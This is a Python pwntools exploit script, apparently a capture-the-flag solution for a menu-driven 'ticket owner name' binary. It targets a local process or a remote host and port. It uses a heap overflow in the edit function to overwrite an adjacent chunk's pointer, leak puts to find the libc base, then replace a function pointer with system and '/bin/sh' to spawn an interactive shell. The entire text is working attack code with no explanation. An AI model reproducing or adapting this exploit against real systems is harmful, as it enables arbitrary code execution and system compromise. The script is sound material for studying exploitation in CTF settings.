from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./task_main")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./task_main")
else:
	p = remote("49.4.15.125","32076")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xf22)))

def menu(choice):
	p.sendlineafter("Choice >> \n",str(choice))

def add(size,name):
	menu(1)
	p.sendlineafter("The length of my owner's name:\n",str(size))
	p.sendafter("Give me my owner's name:\n",name)

def edit(index,size,name):
	menu(3)
	p.sendlineafter("Please tell me which tickets would you want to change it's owner's name?\n",str(index))
	p.sendlineafter("The length of my owner's name:\n",str(size))
	p.sendafter("Give me my owner's name:\n",name)

def show(index):
	menu(2)
	p.sendlineafter("Please tell me which tickets would you want to open?\n",str(index))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
add(0x10,"a")
add(0x10,"a")
payload = p64(0) * 3 + p64(0x21) + "\x58"
edit(0,0x30,payload)
show(1)
p.recvuntil("I will tell you who is my owner!\n")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["puts"]
log.success("libc_base:" + hex(libc.address))
binsh = libc.search("/bin/sh").next()
system = libc.symbols["system"]
payload = p64(0) * 3 + p64(0x21) + p64(binsh) + p64(system)
edit(0,0x40,payload)
show(1)
p.interactive()
